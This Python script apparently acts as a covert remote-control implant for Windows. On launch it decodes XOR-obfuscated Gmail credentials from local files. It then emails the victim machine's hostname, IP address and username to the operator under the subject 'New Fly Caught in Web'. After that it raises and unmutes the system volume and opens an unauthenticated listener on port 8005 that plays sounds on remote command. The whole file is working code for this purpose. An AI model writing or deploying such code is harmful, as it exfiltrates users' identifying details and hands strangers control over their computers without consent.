# server aka recieve
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import random as rand
from ctypes import cast, POINTER
import os
import winsound
import socket
import smtplib 

with open("umad/cipher.txt","r") as file:
    xor_key = file.read().strip()

def run():
    for x in range(5):
        winsound.Beep(3000,50)
run()
def xor_cipher(text, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))

def spider_web():
    with open("umad/email.txt", "r") as file:
        email = file.read().strip()
        email_name = xor_cipher(email, xor_key)
        file.close()
    with open("umad/key.txt", "r") as key:
        passw = key.read().strip()
        deobfuscated_key = xor_cipher(passw, xor_key)
        key.close()    

    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    user = os.getlogin()
    subject = "New Fly Caught in Web"
    body = f"Fly Caught Hostname: {hostname} Ip: {ip} Username: {user}"
    email_message = f"Subject: {subject}\n\n{body}"
    try:
        server = smtplib.SMTP_SSL("smtp.gmail.com",465)
        server.login(email_name,deobfuscated_key)
        server.sendmail(email_name,email_name,email_message)
        server.quit()
    except Exception as e:
        print(f"Error: {e}")
spider_web()

folder_path = "/umad/Audio"
filenames_1 = os.listdir(folder_path)
filenames = []


for file_name in filenames_1:
    filenames.append(file_name.split(".")[0])

devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))
os.chdir(os.path.dirname(os.path.realpath(__file__)))

def make_noise(specific_noise):
    volume.SetMasterVolumeLevel(-2.0, None)
    volume.SetMute(0, None)
    if specific_noise:
        winsound.PlaySound("audio/" + specific_noise,winsound.SND_FILENAME)
    else:
        winsound.PlaySound("audio/" + filenames[rand.randint(0,len(filenames)-1)], winsound.SND_FILENAME) 

def process_data(data):
    if data:
        response = f"Recieved:{data}"
        return response
    return ""

def start_server(host,port):
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host,port))
        server_socket.listen(1)
        print(f"Listening on {host}")
        while True:
            conn, addr = server_socket.accept()
            with conn:
                print("Connected by ", addr)
                data = conn.recv(1024).decode()
                data = data.lower()
                if not data:
                    continue
                print("Recieved Data:",data)
                if data == "random":
                    make_noise("")
                elif data in filenames:
                    make_noise(str(data))
                response = process_data(data)
                conn.sendall(response.encode())

if __name__ == "__main__":
    host = "0.0.0.0"
    port = 8005
    start_server(host,port)
